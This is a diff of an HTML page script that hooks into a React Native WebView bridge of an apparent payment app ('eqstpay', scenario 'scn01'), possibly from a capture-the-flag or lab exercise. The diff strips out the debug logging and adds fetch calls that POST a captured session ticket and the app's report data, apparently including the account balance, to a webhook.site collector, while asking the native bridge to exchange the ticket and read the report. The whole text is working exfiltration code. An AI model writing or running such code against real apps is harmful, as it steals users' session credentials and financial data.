@@ -2,33 +2,19 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-<pre id="log"></pre>
 <script>
-var o=document.getElementById("log");
-function log(m){o.textContent+=m+"\n";}
-
 window.addEventListener("eqstpay:scn01:ticket",function(e){
   var t=e.detail&&e.detail.ticket;
-  log("ticket="+t);
   if(!t)return;
-  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t}));log("EXCHANGE OK");}catch(x){log("ERR:"+x);}
+  fetch("https://webhook.site/e803b6af-205b-40de-861b-e5bb1731c100",{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:t});
+  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t}));}catch(x){}
 });
-
 window.addEventListener("eqstpay:scn01:session",function(){
-  log("session received, trying READ_REPORT");
-  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"WEB_SESSION",action:"READ_REPORT"}));log("READ_REPORT OK");}catch(x){log("ERR1:"+x);}
-  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"WEB_SESSION",action:"READ"}));log("READ OK");}catch(x){log("ERR2:"+x);}
-  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"REPORT",action:"READ"}));log("REPORT/READ OK");}catch(x){log("ERR3:"+x);}
+  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"REPORT",action:"READ"}));}catch(x){}
 });
-
 window.addEventListener("eqstpay:scn01:report",function(e){
   var r=(e.detail&&e.detail.report)||{};
-  log("REPORT DATA: "+JSON.stringify(r));
-  log("BALANCE RAW: "+r.balance);
-});
-
-window.addEventListener("eqstpay:scn01:error",function(e){
-  log("ERROR:"+String((e.detail||{}).message||"unknown"));
+  fetch("https://webhook.site/e803b6af-205b-40de-861b-e5bb1731c100",{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:"REPORT:"+JSON.stringify(r)});
 });
 </script>
 </body>
